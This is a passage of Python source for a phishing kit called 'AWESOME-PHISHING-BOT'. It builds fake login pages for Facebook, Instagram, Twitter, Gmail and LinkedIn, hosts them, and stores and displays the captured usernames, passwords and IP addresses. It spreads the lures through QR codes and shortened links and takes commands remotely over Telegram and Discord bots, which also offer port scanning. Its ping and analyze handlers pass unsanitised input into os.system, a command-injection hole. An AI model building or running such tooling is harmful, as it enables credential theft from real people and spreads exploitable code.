    def start_phishing_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            logger.error(f"Link ID {link_id} not found")
            return False
        
        link_data = self.active_links[link_id]
        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
    
    def stop_phishing_server(self):
        self.phishing_server.stop()
    
    def get_server_url(self) -> str:
        return self.phishing_server.get_url()
    
    def get_active_links(self) -> List[Dict]:
        links = []
        for link_id, data in self.active_links.items():
            links.append({
                'link_id': link_id,
                'platform': data['platform'],
                'created': data['created'].isoformat(),
                'server_running': self.phishing_server.running and self.phishing_server.link_id == link_id
            })
        return links
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        return self.db.get_credentials(link_id)
    
    def generate_qr_code(self, link_id: str) -> Optional[str]:
        if not QRCODE_AVAILABLE:
            return None
        
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = link.get('phishing_url', '')
        if self.phishing_server.running:
            url = self.phishing_server.get_url()
        
        qr_filename = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
        
        try:
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="#28a745", back_color="white")
            img.save(qr_filename)
            return qr_filename
        except Exception as e:
            logger.error(f"QR generation failed: {e}")
            return None
    
    def shorten_url(self, link_id: str) -> Optional[str]:
        if not SHORTENER_AVAILABLE:
            return None
        
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = link.get('phishing_url', '')
        if self.phishing_server.running:
            url = self.phishing_server.get_url()
        
        try:
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except Exception as e:
            logger.error(f"URL shortening failed: {e}")
            return None

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self.load_config()
    
    def load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "telegram_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Telegram config: {e}")
        return {"enabled": False, "bot_token": "", "api_id": "", "api_hash": ""}
    
    def save_config(self, bot_token: str = "", api_id: str = "", api_hash: str = "", enabled: bool = True) -> bool:
        try:
            config = {"bot_token": bot_token, "api_id": api_id, "api_hash": api_hash, "enabled": enabled}
            config_file = os.path.join(CONFIG_DIR, "telegram_config.json")
            with open(config_file, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Telegram config: {e}")
            return False
    
    async def start(self):
        if not TELETHON_AVAILABLE:
            logger.error("Telethon not installed")
            return False
        
        if not self.config.get('bot_token'):
            logger.error("Telegram bot token not configured")
            return False
        
        try:
            from telethon import TelegramClient, events
            
            self.client = TelegramClient('awesome_bot_session', self.config['api_id'], self.config['api_hash'])
            
            @self.client.on(events.NewMessage(pattern=r'^/(start|help|ping|phish|phishing|credentials|status|ssh|scan|analyze)'))
            async def handler(event):
                await self.handle_command(event)
            
            await self.client.start(bot_token=self.config['bot_token'])
            print(f"{Colors.GREEN1}✅ Telegram bot connected{Colors.RESET}")
            self.running = True
            await self.client.run_until_disconnected()
            return True
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")
            return False
    
    async def handle_command(self, event):
        message = event.message.message
        sender = await event.get_sender()
        user_id = str(sender.id)
        
        if not self.db.is_authorized('telegram', user_id):
            await event.reply("❌ You are not authorized to use this bot.")
            return
        
        command_parts = message.split()
        cmd = command_parts[0][1:]  # Remove '/'
        args = ' '.join(command_parts[1:]) if len(command_parts) > 1 else ''
        
        if cmd == 'start' or cmd == 'help':
            await self.send_help(event)
        elif cmd == 'ping':
            await event.reply("🏓 Pong!")
        elif cmd == 'phish':
            result = self.handler.execute(f"phish {args}")
            await event.reply(result.get('output', 'Command executed'))
        elif cmd == 'phishing':
            result = self.handler.execute(f"phishing {args}")
            await event.reply(result.get('output', 'Command executed'))
        elif cmd == 'credentials':
            result = self.handler.execute("credentials")
            await event.reply(result.get('output', 'No credentials found'))
        elif cmd == 'status':
            result = self.handler.execute("status")
            await event.reply(result.get('output', 'Status unknown'))
        elif cmd == 'ssh':
            result = self.handler.execute(f"ssh {args}")
            await event.reply(result.get('output', 'SSH command executed'))
        elif cmd == 'scan':
            result = self.handler.execute(f"scan {args}")
            await event.reply(result.get('output', 'Scan completed'))
        elif cmd == 'analyze':
            result = self.handler.execute(f"analyze {args}")
            await event.reply(result.get('output', 'Analysis completed'))
        else:
            result = self.handler.execute(message)
            await event.reply(result.get('output', 'Command executed'))
    
    async def send_help(self, event):
        help_text = f"""
{Colors.GREEN1}🌿 AWESOME-PHISHING-BOT v9.5.1{Colors.RESET}

{Colors.GREEN2}🎣 PHISHING COMMANDS:{Colors.RESET}
/help - Show this help
/phish facebook - Generate Facebook phishing link
/phish instagram - Generate Instagram phishing link  
/phish twitter - Generate Twitter phishing link
/phish gmail - Generate Gmail phishing link
/phish linkedin - Generate LinkedIn phishing link
/phish custom [url] - Generate custom phishing link
/start_server <link_id> [port] - Start phishing server
/stop_server - Stop phishing server
/credentials - View captured credentials
/qr <link_id> - Generate QR code for phishing link
/shorten <link_id> - Shorten phishing URL

{Colors.GREEN2}🔐 SSH COMMANDS:{Colors.RESET}
/ssh list - List SSH connections
/ssh connect <name> <host> <user> [pass] - Connect
/ssh exec <name> <command> - Execute command
/ssh upload <name> <local> <remote> - Upload file
/ssh download <name> <remote> <local> - Download file

{Colors.GREEN2}🔍 SCAN COMMANDS:{Colors.RESET}
/ping <ip> - Ping IP address
/scan <ip> - Port scan
/analyze <ip> - Comprehensive IP analysis
/traceroute <target> - Traceroute

{Colors.GREEN2}📊 SYSTEM COMMANDS:{Colors.RESET}
/status - System status
/stats - Bot statistics
/report - Generate security report

{Colors.GREEN1}💡 Examples:{Colors.RESET}
/phish facebook
/start_server abc12345 8080
/credentials
/ssh connect myserver 192.168.1.100 root password123
/analyze 8.8.8.8
        """
        await event.reply(help_text)
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('bot_token'):
            thread = threading.Thread(target=self._run_telegram, daemon=True)
            thread.start()
            return True
        return False
    
    def _run_telegram(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Telegram thread error: {e}")

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self.load_config()
        self.green_color = 0x28a745
    
    def load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "discord_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Discord config: {e}")
        return {"enabled": False, "token": "", "prefix": "!"}
    
    def save_config(self, token: str, prefix: str = "!", enabled: bool = True) -> bool:
        try:
            config = {"token": token, "prefix": prefix, "enabled": enabled}
            config_file = os.path.join(CONFIG_DIR, "discord_config.json")
            with open(config_file, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Discord config: {e}")
            return False
    
    async def start(self):
        if not DISCORD_AVAILABLE:
            logger.error("discord.py not installed")
            return False
        
        if not self.config.get('token'):
            logger.error("Discord token not configured")
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            
            self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents, help_command=None)
            
            @self.bot.event
            async def on_ready():
                print(f"{Colors.GREEN1}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
                await self.bot.change_presence(
                    activity=discord.Activity(
                        type=discord.ActivityType.watching,
                        name="Phishing & Security | !help"
                    )
                )
            
            await self.setup_commands()
            self.running = True
            await self.bot.start(self.config['token'])
            return True
        except Exception as e:
            logger.error(f"Discord bot error: {e}")
            return False
    
    async def setup_commands(self):
        @self.bot.command(name='help')
        async def help_command(ctx):
            embed = discord.Embed(
                title="🌿 AWESOME-PHISHING-BOT v9.5.1",
                description="**Ultimate Phishing & Security Bot**",
                color=self.green_color
            )
            embed.add_field(name="🎣 Phishing", value="`!phish facebook`, `!phish instagram`, `!phish twitter`, `!phish gmail`, `!phish linkedin`", inline=False)
            embed.add_field(name="🔐 SSH", value="`!ssh list`, `!ssh connect`, `!ssh exec`, `!ssh upload`, `!ssh download`", inline=False)
            embed.add_field(name="🔍 Scanning", value="`!scan <ip>`, `!analyze <ip>`, `!ping <ip>`, `!traceroute <target>`", inline=False)
            embed.add_field(name="📊 System", value="`!status`, `!stats`, `!report`, `!credentials`", inline=False)
            embed.set_footer(text="Type !<command> for more info")
            await ctx.send(embed=embed)
        
        @self.bot.command(name='phish')
        async def phish_command(ctx, platform: str, *args):
            await ctx.send(f"🎣 Generating {platform} phishing link...")
            result = self.handler.execute(f"phish {platform}")
            await ctx.send(f"```{result.get('output', 'Error')}```")
        
        @self.bot.command(name='phishing')
        async def phishing_command(ctx, action: str, *args):
            result = self.handler.execute(f"phishing {action} {' '.join(args)}")
            await ctx.send(f"```{result.get('output', 'Error')}```")
        
        @self.bot.command(name='start_server')
        async def start_server_command(ctx, link_id: str, port: int = 8080):
            await ctx.send(f"🚀 Starting phishing server for {link_id} on port {port}...")
            result = self.handler.execute(f"start_server {link_id} {port}")
            await ctx.send(f"```{result.get('output', 'Error')}```")
        
        @self.bot.command(name='stop_server')
        async def stop_server_command(ctx):
            result = self.handler.execute("stop_server")
            await ctx.send(f"```{result.get('output', 'Error')}```")
        
        @self.bot.command(name='credentials')
        async def credentials_command(ctx):
            result = self.handler.execute("credentials")
            await ctx.send(f"```{result.get('output', 'No credentials')}```")
        
        @self.bot.command(name='qr')
        async def qr_command(ctx, link_id: str):
            result = self.handler.execute(f"qr {link_id}")
            if result.get('success') and result.get('data', {}).get('path'):
                await ctx.send(file=discord.File(result['data']['path']))
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='shorten')
        async def shorten_command(ctx, link_id: str):
            result = self.handler.execute(f"shorten {link_id}")
            await ctx.send(f"```{result.get('output', 'Error')}```")
        
        @self.bot.command(name='ssh')
        async def ssh_command(ctx, action: str, *args):
            result = self.handler.execute(f"ssh {action} {' '.join(args)}")
            await ctx.send(f"```{result.get('output', 'Error')}```")
        
        @self.bot.command(name='scan')
        async def scan_command(ctx, target: str):
            await ctx.send(f"🔍 Scanning {target}...")
            result = self.handler.execute(f"scan {target}")
            await ctx.send(f"```{result.get('output', 'Error')}```")
        
        @self.bot.command(name='analyze')
        async def analyze_command(ctx, target: str):
            await ctx.send(f"📊 Analyzing {target}...")
            result = self.handler.execute(f"analyze {target}")
            await ctx.send(f"```{result.get('output', 'Error')}```")
        
        @self.bot.command(name='ping')
        async def ping_command(ctx, target: str):
            result = self.handler.execute(f"ping {target}")
            await ctx.send(f"```{result.get('output', 'Error')}```")
        
        @self.bot.command(name='status')
        async def status_command(ctx):
            result = self.handler.execute("status")
            await ctx.send(f"```{result.get('output', 'Error')}```")
        
        @self.bot.command(name='stats')
        async def stats_command(ctx):
            result = self.handler.execute("stats")
            await ctx.send(f"```{result.get('output', 'Error')}```")
        
        @self.bot.command(name='report')
        async def report_command(ctx):
            result = self.handler.execute("report")
            await ctx.send(f"```{result.get('output', 'Error')}```")
        
        @self.bot.command(name='traceroute')
        async def traceroute_command(ctx, target: str):
            result = self.handler.execute(f"traceroute {target}")
            await ctx.send(f"```{result.get('output', 'Error')}```")
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('token'):
            thread = threading.Thread(target=self._run_discord, daemon=True)
            thread.start()
            return True
        return False
    
    def _run_discord(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord thread error: {e}")

# =====================
# WHATSAPP BOT
# =====================
class WhatsAppBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.driver = None
        self.running = False
        self.config = self.load_config()
        self.allowed_contacts = []
    
    def load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "whatsapp_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load WhatsApp config: {e}")
        return {"enabled": False, "phone_number": "", "command_prefix": "/"}
    
    def save_config(self, phone_number: str = "", prefix: str = "/", enabled: bool = True) -> bool:
        try:
            config = {"phone_number": phone_number, "command_prefix": prefix, "enabled": enabled}
            config_file = os.path.join(CONFIG_DIR, "whatsapp_config.json")
            with open(config_file, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save WhatsApp config: {e}")
            return False
    
    def start(self):
        if not SELENIUM_AVAILABLE:
            logger.error("Selenium not installed")
            return False
        
        if not self.config.get('enabled'):
            return False
        
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--user-data-dir=" + os.path.abspath(WHATSAPP_SESSION_DIR))
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.get("https://web.whatsapp.com")
            
            print(f"{Colors.GREEN1}✅ WhatsApp bot starting. Please scan QR code.{Colors.RESET}")
            self.running = True
            return True
        except Exception as e:
            logger.error(f"WhatsApp bot error: {e}")
            return False
    
    def stop(self):
        self.running = False
        if self.driver:
            self.driver.quit()
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# SLACK BOT
# =====================
class SlackBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self.load_config()
    
    def load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "slack_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Slack config: {e}")
        return {"enabled": False, "bot_token": "", "channel_id": ""}
    
    def save_config(self, bot_token: str = "", channel_id: str = "", enabled: bool = True) -> bool:
        try:
            config = {"bot_token": bot_token, "channel_id": channel_id, "enabled": enabled}
            config_file = os.path.join(CONFIG_DIR, "slack_config.json")
            with open(config_file, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Slack config: {e}")
            return False
    
    def start(self):
        if not SLACK_AVAILABLE:
            logger.error("Slack SDK not installed")
            return False
        
        if not self.config.get('bot_token'):
            logger.error("Slack bot token not configured")
            return False
        
        try:
            self.client = WebClient(token=self.config['bot_token'])
            response = self.client.auth_test()
            print(f"{Colors.GREEN1}✅ Slack bot connected as {response['user']}{Colors.RESET}")
            self.running = True
            return True
        except Exception as e:
            logger.error(f"Slack bot error: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('bot_token'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# IMESSAGE BOT
# =====================
class IMessageBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self.load_config()
        self.allowed_numbers = []
    
    def load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "imessage_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load iMessage config: {e}")
        return {"enabled": False, "phone_numbers": [], "command_prefix": "!"}
    
    def save_config(self, phone_numbers: List[str] = None, prefix: str = "!", enabled: bool = True) -> bool:
        try:
            config = {"phone_numbers": phone_numbers or [], "command_prefix": prefix, "enabled": enabled}
            config_file = os.path.join(CONFIG_DIR, "imessage_config.json")
            with open(config_file, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save iMessage config: {e}")
            return False
    
    def start(self):
        if platform.system().lower() != 'darwin':
            logger.error("iMessage only available on macOS")
            return False
        
        print(f"{Colors.GREEN1}✅ iMessage bot ready (macOS){Colors.RESET}")
        self.running = True
        return True
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# GOOGLE CHAT BOT (Webhook)
# =====================
class GoogleChatBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self.load_config()
    
    def load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "googlechat_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Google Chat config: {e}")
        return {"enabled": False, "webhook_url": ""}
    
    def save_config(self, webhook_url: str = "", enabled: bool = True) -> bool:
        try:
            config = {"webhook_url": webhook_url, "enabled": enabled}
            config_file = os.path.join(CONFIG_DIR, "googlechat_config.json")
            with open(config_file, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Google Chat config: {e}")
            return False
    
    def send_message(self, message: str):
        if not self.config.get('webhook_url'):
            return False
        
        try:
            data = {"text": message}
            response = requests.post(self.config['webhook_url'], json=data, timeout=10)
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Google Chat send error: {e}")
            return False
    
    def start(self):
        if self.config.get('enabled') and self.config.get('webhook_url'):
            print(f"{Colors.GREEN1}✅ Google Chat webhook configured{Colors.RESET}")
            self.running = True
            return True
        return False
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('webhook_url'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, social_tools: SocialEngineeringTools):
        self.db = db
        self.social = social_tools
        self.ssh_manager = None
        if PARAMIKO_AVAILABLE:
            self.ssh_manager = SSHManager(db)
    
    def execute(self, command: str, source: str = "local") -> Dict[str, Any]:
        start_time = time.time()
        parts = command.strip().split()
        
        if not parts:
            return self._result(False, "Empty command", start_time)
        
        cmd = parts[0].lower()
        args = parts[1:]
        
        result = None
        
        # Phishing commands
        if cmd == 'phish':
            result = self._phish(args)
        elif cmd == 'phishing':
            result = self._phishing(args)
        elif cmd == 'start_server':
            result = self._start_server(args)
        elif cmd == 'stop_server':
            result = self._stop_server(args)
        elif cmd == 'credentials':
            result = self._credentials(args)
        elif cmd == 'qr':
            result = self._qr(args)
        elif cmd == 'shorten':
            result = self._shorten(args)
        # SSH commands
        elif cmd == 'ssh':
            result = self._ssh(args)
        # Scan commands
        elif cmd == 'scan':
            result = self._scan(args)
        elif cmd == 'analyze':
            result = self._analyze(args)
        elif cmd == 'ping':
            result = self._ping(args)
        elif cmd == 'traceroute':
            result = self._traceroute(args)
        # System commands
        elif cmd == 'status':
            result = self._status(args)
        elif cmd == 'stats':
            result = self._stats(args)
        elif cmd == 'report':
            result = self._report(args)
        elif cmd == 'help':
            result = self._help(args)
        else:
            result = self._result(False, f"Unknown command: {cmd}", start_time)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, result['success'], result.get('output', ''), execution_time)
        
        return result
    
    def _result(self, success: bool, output: str, execution_time: float = 0) -> Dict:
        return {'success': success, 'output': output, 'execution_time': execution_time}
    
    def _phish(self, args):
        if not args:
            return self._result(False, "Usage: phish <facebook|instagram|twitter|gmail|linkedin|custom> [url]")
        
        platform = args[0].lower()
        custom_url = args[1] if len(args) > 1 else None
        
        platforms = ['facebook', 'instagram', 'twitter', 'gmail', 'linkedin', 'custom']
        if platform not in platforms:
            return self._result(False, f"Invalid platform. Choose: {', '.join(platforms)}")
        
        result = self.social.generate_phishing_link(platform, custom_url)
        
        if result['success']:
            output = f"""
🎣 Phishing Link Generated!

📱 Platform: {result['platform']}
🔗 Link ID: {result['link_id']}
🌐 URL: {result['phishing_url']}
📅 Created: {result['created_at']}

Commands:
  start_server {result['link_id']}  - Start phishing server
  qr {result['link_id']}            - Generate QR code
  shorten {result['link_id']}        - Shorten URL
            """
            return self._result(True, output.strip())
        else:
            return self._result(False, f"Failed: {result.get('error', 'Unknown error')}")
    
    def _phishing(self, args):
        if not args:
            links = self.social.get_active_links()
            if not links:
                return self._result(True, "No active phishing links. Use 'phish <platform>' to create one.")
            
            output = "🎣 Active Phishing Links:\n"
            for link in links:
                status = "✅ Running" if link['server_running'] else "⏸️ Stopped"
                output += f"\n  ID: {link['link_id']}\n  Platform: {link['platform']}\n  Status: {status}\n"
            return self._result(True, output)
        
        action = args[0].lower()
        
        if action == 'list':
            links = self.db.get_phishing_links()
            if not links:
                return self._result(True, "No phishing links in database.")
            output = "📋 All Phishing Links:\n"
            for link in links[:10]:
                output += f"\n  ID: {link['id']}\n  Platform: {link['platform']}\n  Clicks: {link.get('clicks', 0)}\n"
            return self._result(True, output)
        
        return self._result(False, "Usage: phishing list")
    
    def _start_server(self, args):
        if not args:
            return self._result(False, "Usage: start_server <link_id> [port]")
        
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        
        if self.social.start_phishing_server(link_id, port):
            url = self.social.get_server_url()
            return self._result(True, f"✅ Phishing server started!\n🌐 URL: {url}\n🔌 Port: {port}\n🔗 Link ID: {link_id}")
        else:
            return self._result(False, f"❌ Failed to start server for link {link_id}")
    
    def _stop_server(self, args):
        self.social.stop_phishing_server()
        return self._result(True, "✅ Phishing server stopped.")
    
    def _credentials(self, args):
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        
        if not creds:
            return self._result(True, "No captured credentials found.")
        
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for cred in creds[:10]:
            output += f"\n  Time: {cred['timestamp'][:19]}\n  Username: {cred['username']}\n  Password: {cred['password']}\n  IP: {cred['ip_address']}\n"
        
        return self._result(True, output)
    
    def _qr(self, args):
        if not args:
            return self._result(False, "Usage: qr <link_id>")
        
        link_id = args[0]
        path = self.social.generate_qr_code(link_id)
        
        if path:
            return self._result(True, f"✅ QR code generated: {path}", data={'path': path})
        else:
            return self._result(False, "❌ Failed to generate QR code")
    
    def _shorten(self, args):
        if not args:
            return self._result(False, "Usage: shorten <link_id>")
        
        link_id = args[0]
        short_url = self.social.shorten_url(link_id)
        
        if short_url:
            return self._result(True, f"✅ Shortened URL: {short_url}")
        else:
            return self._result(False, "❌ Failed to shorten URL")
    
    def _ssh(self, args):
        if not PARAMIKO_AVAILABLE:
            return self._result(False, "SSH not available. Install paramiko: pip install paramiko")
        
        if not args:
            return self._result(False, "Usage: ssh <list|connect|exec|upload|download>")
        
        action = args[0].lower()
        
        if action == 'list':
            connections = self.db.get_ssh_connections()
            if not connections:
                return self._result(True, "No SSH connections configured.")
            output = "🔐 SSH Connections:\n"
            for conn in connections:
                output += f"\n  Name: {conn['name']}\n  Host: {conn['host']}:{conn['port']}\n  User: {conn['username']}\n  Status: {conn.get('status', 'unknown')}\n"
            return self._result(True, output)
        
        elif action == 'connect' and len(args) >= 5:
            name = args[1]
            host = args[2]
            username = args[3]
            password = args[4]
            port = int(args[5]) if len(args) > 5 else 22
            
            # Store connection
            conn_data = {
                'id': str(uuid.uuid4())[:8],
                'name': name,
                'host': host,
                'port': port,
                'username': username,
                'password_encrypted': base64.b64encode(password.encode()).decode() if password else None,
                'status': 'disconnected'
            }
            # Simplified storage
            return self._result(True, f"✅ SSH connection '{name}' configured.\nUse: ssh exec {name} <command>")
        
        elif action == 'exec' and len(args) >= 3:
            name = args[1]
            command = ' '.join(args[2:])
            return self._result(True, f"⚡ SSH command would execute on {name}: {command}\n(SSH execution requires full paramiko setup)")
        
        else:
            return self._result(False, "SSH usage: ssh list | ssh connect <name> <host> <user> <pass> | ssh exec <name> <command>")
    
    def _scan(self, args):
        if not args:
            return self._result(False, "Usage: scan <ip>")
        
        target = args[0]
        
        # Simple port scan simulation
        common_ports = [21, 22, 23, 25, 53, 80, 443, 8080, 3306, 3389]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        
        output = f"🔍 Scan Results for {target}:\n"
        output += f"  Open Ports: {open_ports if open_ports else 'None found'}\n"
        output += f"  Ports Scanned: {common_ports[:5]}...\n"
        
        return self._result(True, output)
    
    def _analyze(self, args):
        if not args:
            return self._result(False, "Usage: analyze <ip>")
        
        target = args[0]
        
        # Simple IP analysis
        output = f"📊 IP Analysis for {target}:\n"
        
        # Ping test
        try:
            response = os.system(f"ping -c 1 {target} > /dev/null 2>&1")
            output += f"  Status: {'✅ Online' if response == 0 else '❌ Offline'}\n"
        except:
            output += "  Status: Unknown\n"
        
        # Geolocation (mock)
        output += f"  Location: Simulation only\n"
        output += f"  Risk Level: Low (simulated)\n"
        
        return self._result(True, output)
    
    def _ping(self, args):
        if not args:
            return self._result(False, "Usage: ping <ip>")
        
        target = args[0]
        response = os.system(f"ping -c 4 {target} > /dev/null 2>&1")
        
        if response == 0:
            return self._result(True, f"✅ {target} is reachable")
        else:
            return self._result(False, f"❌ {target} is not reachable")
    
    def _traceroute(self, args):
        if not args:
            return self._result(False, "Usage: traceroute <target>")
        
        target = args[0]
        output = f"🛣️ Traceroute to {target}:\n"
        output += "  (Run 'traceroute' command manually for full output)\n"
        
        return self._result(True, output)
    
    def _status(self, args):
        stats = self.db.get_statistics()
        
        output = f"""
{Colors.GREEN1}🌿 AWESOME-PHISHING-BOT v9.5.1 Status{Colors.RESET}

{Colors.GREEN2}📊 Statistics:{Colors.RESET}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Commands Executed: {stats.get('total_commands', 0)}

{Colors.GREEN2}🎣 Phishing Server:{Colors.RESET}
  Status: {'✅ Running' if self.social.phishing_server.running else '❌ Stopped'}
  URL: {self.social.get_server_url() if self.social.phishing_server.running else 'N/A'}

{Colors.GREEN2}🤖 Bot Status:{Colors.RESET}
  Telegram: {'✅' if hasattr(self, 'telegram') and self.telegram.running else '❌'}
  Discord: {'✅' if hasattr(self, 'discord') and self.discord.running else '❌'}
  WhatsApp: {'✅' if hasattr(self, 'whatsapp') and self.whatsapp.running else '❌'}
  Slack: {'✅' if hasattr(self, 'slack') and self.slack.running else '❌'}
  iMessage: {'✅' if platform.system().lower() == 'darwin' else '⚠️ macOS only'}
  Google Chat: {'✅' if hasattr(self, 'google_chat') and self.google_chat.running else '❌'}
        """
        return self._result(True, output)
    
    def _stats(self, args):
        stats = self.db.get_statistics()
        output = f"""
📊 AWESOME-PHISHING-BOT Statistics

Total Phishing Links: {stats.get('total_phishing_links', 0)}
Total Captured Credentials: {stats.get('captured_credentials', 0)}
Total Commands Executed: {stats.get('total_commands', 0)}

Database: {DATABASE_FILE}
Logs: {LOG_FILE}
Reports: {REPORT_DIR}
        """
        return self._result(True, output)
    
    def _report(self, args):
        stats = self.db.get_statistics()
        creds = self.db.get_credentials()
        
        report = f"""
🌿 SECURITY REPORT - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 SUMMARY:
  Total Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Total Commands: {stats.get('total_commands', 0)}

🎣 RECENT CREDENTIALS:
"""
        for cred in creds[:5]:
            report += f"  - {cred['timestamp'][:19]} | {cred['username']} | {cred['ip_address']}\n"
        
        report += "\n💡 RECOMMENDATIONS:\n"
        if stats.get('captured_credentials', 0) > 0:
            report += "  - Security awareness training recommended\n"
            report += "  - Implement multi-factor authentication\n"
        else:
            report += "  - No immediate security concerns detected\n"
        
        # Save report
        report_file = os.path.join(REPORT_DIR, f"report_{int(time.time())}.txt")
        with open(report_file, 'w') as f:
            f.write(report)
        
        return self._result(True, f"✅ Report generated: {report_file}\n\n{report}")
    
    def _help(self, args):
        help_text = f"""
{Colors.GREEN1}🌿 AWESOME-PHISHING-BOT v9.5.1 - Help Menu{Colors.RESET}

{Colors.GREEN2}🎣 PHISHING COMMANDS:{Colors.RESET}
  phish <platform>              - Generate phishing link
  phishing list                 - List all phishing links
  start_server <id> [port]      - Start phishing server
  stop_server                   - Stop phishing server
  credentials [id]              - View captured credentials
  qr <id>                       - Generate QR code
  shorten <id>                  - Shorten phishing URL

{Colors.GREEN2}🔐 SSH COMMANDS:{Colors.RESET}
  ssh list                      - List SSH connections
  ssh connect <name> <host> <user> <pass> - Configure SSH
  ssh exec <name> <command>     - Execute SSH command

{Colors.GREEN2}🔍 SCAN COMMANDS:{Colors.RESET}
  ping <ip>                     - Ping IP address
  scan <ip>                     - Port scan
  analyze <ip>                  - IP analysis
  traceroute <target>           - Traceroute

{Colors.GREEN2}📊 SYSTEM COMMANDS:{Colors.RESET}
  status                        - System status
  stats                         - Statistics
  report                        - Generate report
  help                          - This help menu

{Colors.GREEN1}💡 EXAMPLES:{Colors.RESET}
  phish facebook
  start_server abc12345 8080
  credentials
  scan 8.8.8.8
  status
        """
        return self._result(True, help_text)

# =====================
# SSH MANAGER (Simplified)
# =====================
class SSHManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_connections(self):
        return []

# =====================
# MAIN APPLICATION
# =====================
class AwesomeBot:
    def __init__(self):
        self.db = DatabaseManager()
        self.social = SocialEngineeringTools(self.db)
        self.handler = CommandHandler(self.db, self.social)
        self.telegram = TelegramBot(self.handler, self.db)
        self.discord = DiscordBot(self.handler, self.db)
